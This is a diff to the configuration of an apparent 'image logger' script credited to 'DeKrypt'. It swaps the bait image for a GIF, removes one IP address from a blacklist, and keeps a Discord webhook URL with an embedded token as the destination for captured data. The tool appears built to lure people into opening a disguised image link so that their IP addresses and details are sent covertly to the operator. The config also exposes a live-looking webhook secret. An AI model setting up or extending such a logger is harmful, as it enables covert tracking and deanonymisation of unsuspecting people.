@@ -11,7 +11,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1346403158162800660/M_kDldAOrgbfEOmgAAhFBW0JleXe30ubVBdqGGKjBm89qLmlqC4HTxJRVflQ6Cdum3J3",
-    "image": "https://th.bing.com/th/id/OIP.Xc6QPXH_WXlGYFj3f1FJXgHaDr?rs=1&pid=ImgDetMain", # You can also have a custom image by using a URL argument
+    "image": "https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExcGVpOW56ODlidzB4bnE0ZnJzYjIzZDd4ajd1dG9kb3d0bG9iOWd3ayZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/TGG3ASscmS29SUheCd/giphy.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -61,7 +61,7 @@ config = {
     # 4) Image 
 }
 
-blacklistedIPs = ("27", "104", "143", "164", "84.157.96.55") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
+blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                            # This feature is undocumented mainly due to it being for detecting bots better.
 
 def botCheck(ip, useragent):
